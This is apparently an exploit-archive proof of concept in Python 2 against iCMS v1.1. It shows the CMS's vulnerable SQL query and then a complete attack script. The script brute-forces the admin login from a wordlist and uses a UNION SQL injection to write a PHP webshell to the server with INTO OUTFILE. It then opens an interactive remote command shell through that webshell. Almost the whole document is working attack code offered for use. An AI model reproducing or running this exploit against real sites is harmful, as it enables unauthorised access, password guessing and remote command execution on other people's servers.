# ~INFORMATION
# Exploit Title:        iCMS v1.1 Admin SQLi/bruteforce Exploit
# Author:               TecR0c
# Date:                 18/3/2011
# Software link:        http://bit.ly/hbYy35
# Tested on:            Linux bt
# Version:              v1.1
# [XXX]: The likelihood of this exploit being successful is low
# as it requires knowledge of the web path and file privileges
# however a PoC is still written ;)
 
# ~VULNERABLE CODE:
&#039;&#039;&#039;
15 $id = $_GET[&#039;id&#039;];
16 $title = NULL;
17 $text = NULL;
18 database_connect();
19 $query = "select title,text from icmscontent where id = $id;";
20 //echo $query;
21 $result = mysql_query($query);
&#039;&#039;&#039;
#~EXPLOIT
import random,time,sys,urllib,urllib2,re,httplib,socket,base64,os,getpass
from optparse import OptionParser
from urlparse import urlparse,urljoin
from urllib import urlopen
from cookielib import CookieJar
 
__AUTHOR__ ="TecR0c"
__DATE__ ="18.3.2011"
 
usage = &#039;Example : %s http://localhost/iCMS/ -w passwords.txt -p 127.0.0.1:8080&#039; % __file__
parser = OptionParser(usage=usage)
parser.add_option("-p","--proxy", type="string",action="store", dest="proxy",
    help="HTTP Proxy <server>:<port>")
parser.add_option("-u","--username", type="string",action="store", default="admin", dest="username",
    help="Username for login")
parser.add_option("-w","--wordlist", type="string",action="store", dest="wordlist",
    help="file to use to bruteforce password")
 
(options, args) = parser.parse_args()
 
#VARS
sitePath = &#039;/var/www/iCMS/icms/&#039;
webshell = &#039;<?php+system(base64_decode($_REQUEST[cmd]));?>&#039;
 
if options.proxy:
    print &#039;[+] Using Proxy&#039;+options.proxy
# User Agents
agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
    "Internet Explorer 7 (Windows Vista); Mozilla/4.0 ",
    "Google Chrome 0.2.149.29 (Windows XP)",
    "Opera 9.25 (Windows Vista)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
    "Opera/8.00 (Windows NT 5.1; U; en)"]
agent = random.choice(agents)
 
def banner():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")
    header = &#039;&#039;&#039;
|----------------------------------------|
|Exploit: iCMS SQLi RCE
|Author: %s
|Date: %s
|----------------------------------------|\n
&#039;&#039;&#039;%(__AUTHOR__,__DATE__)
    for i in header:
        print "\b%s"%i,
        sys.stdout.flush()
        time.sleep(0.005)
 
def proxyCheck():
    if options.proxy:
        try:
            h2 = httplib.HTTPConnection(options.proxy)
            h2.connect()
            print "[+] Using Proxy Server:",options.proxy
        except(socket.timeout):
            print "[-] Proxy Timed Out\n"
            sys.exit(1)
        except(NameError):
            print "[-] Proxy Not Given\n"
            sys.exit(1)
        except:
            print "[-] Proxy Failed\n"
            sys.exit(1)
 
def getProxy():
    try:
        proxy_handler = urllib2.ProxyHandler({&#039;http&#039;: options.proxy})
    except(socket.timeout):
        print "\n[-] Proxy Timed Out"
        sys.exit(1)
    return proxy_handler
 
cj = CookieJar()
if options.proxy:
    opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj))
else:
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders = [(&#039;User-agent&#039;, agent)]
 
def loginAttempt():
    try:
        passwordlist = open(options.wordlist,&#039;r&#039;).readlines()
        print "[+] Length Of Wordlist: "+str(len(passwordlist))
    except(IOError):
        print "[-] Error: Check Your Wordlist Path\n"
        sys.exit(1)
    for password in passwordlist:
        password = password.replace("\r","").replace("\n","")
        sys.stdout.write(&#039;\r[+] Brute-forcing password with: %s          \r&#039; % password)
        sys.stdout.flush()
        time.sleep(0.2)
        authenticated = login(password)
        if authenticated:
            break
 
def login(password):
    webSiteUrl = url.geturl()+&#039;login.php&#039;
    postParameters = {&#039;formlogin&#039; : options.username,&#039;formpass&#039; : password}
    postParameters = urllib.urlencode(postParameters)
    try:
        response = opener.open(webSiteUrl, postParameters).read()
    except:
        print &#039;\n[-] Could not connect&#039;
        sys.exit()
    loggedIn = re.compile(r"continue to the admin")
    authenticated = loggedIn.search(response)
    if authenticated:
        print &#039;\n[+] logged in as %s&#039; % options.username
    else:
        pass
    return authenticated
 
def performSQLi():
    webSiteUrl = url.geturl()+"/admin/item_detail.php?id=1+union+select+&#039;ph33r&#039;,user()"
    try:
        response = opener.open(webSiteUrl).read()
    except:
        print &#039;\n[-] Failed&#039;
    root = re.compile("root")
    rootuser = root.search(response)
    if rootuser:
        print &#039;[+] I smell ROOT :p~&#039;
        webSiteUrl = url.geturl()+\
        "admin/item_detail.php?id=1+UNION+SELECT+NULL,&#039;TECR0CSHELL"\
        +webshell+"LLEHSC0RCET&#039;+INTO+OUTFILE+&#039;"+sitePath+".webshell.php&#039;"
        opener.open(webSiteUrl)
        print &#039;[+] Wrote WEBSHELL !&#039;
    else:
        print &#039;\n[-] Could not gain access&#039;
        sys.exit()
 
def postRequestWebShell(encodedCommand):
    webSiteUrl = url.geturl()+&#039;.webshell.php&#039;
    commandToExecute = [
    (&#039;cmd&#039;,encodedCommand)]
    cmdData = urllib.urlencode(commandToExecute)
    try:
        response = opener.open(webSiteUrl, cmdData).read()
    except:
        print &#039;[-] Failed&#039;
        sys.exit()
    return response
 
def clean(response):
    patFinder = re.compile(&#039;TECR0CSHELL(.*)LLEHSC0RCET&#039;,re.DOTALL)
    shell = patFinder.search(response)
    response = shell.group(1)
    return response
 
def commandLine():
    commandLine = (&#039;[RSHELL] %s@%s# &#039;) % (getpass.getuser(),url.netloc)
    while True:
        try:
            command = raw_input(commandLine)
            encodedCommand = base64.b64encode(command)
            response = postRequestWebShell(encodedCommand)
            response = clean(response)
            print response
        except KeyboardInterrupt:
            encodedCommand = base64.b64encode(&#039;rm .webshell.php&#039;)
            postRequestWebShell(encodedCommand)
            print "\n[!] Removed .webshell.php\n"
            sys.exit()
 
if "__main__" == __name__:
    banner()
    try:
        url=urlparse(args[0])
    except:
        parser.print_help()
        sys.exit()
    getProxy()
    loginAttempt()
    performSQLi()
    commandLine()



